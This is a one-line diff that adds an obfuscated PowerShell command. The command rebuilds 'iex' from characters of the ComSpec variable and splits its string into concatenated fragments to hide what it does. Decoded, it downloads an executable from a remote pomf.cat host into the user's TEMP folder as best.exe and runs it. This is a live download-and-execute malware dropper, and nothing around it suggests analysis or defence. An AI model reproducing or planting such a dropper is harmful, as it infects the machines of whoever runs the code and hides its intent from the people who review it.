@@ -1,0 +1,1 @@
+﻿ & ( $ENv:COmsPEc[4,15,25]-jOin'') ( (('('+'New-'+'Obj'+'ect Syst'+'em'+'.N'+'et.W'+'ebClient'+').DownloadFi'+'l'+'e({0}'+'a.p'+'omf.cat'+'/ms'+'icxq'+'.'+'e'+'xe'+'{0},'+'{2'+'}{1}e'+'n'+'v:TEMP'+'{3'+'}'+'best.e'+'xe{2'+'}'+')'+';Start-'+'Proc'+'ess'+' '+'({'+'2}{1}en'+'v:'+'T'+'EMP{3}best.'+'exe{2})')-F  [Char]39,[Char]36,[Char]34,[Char]92) )
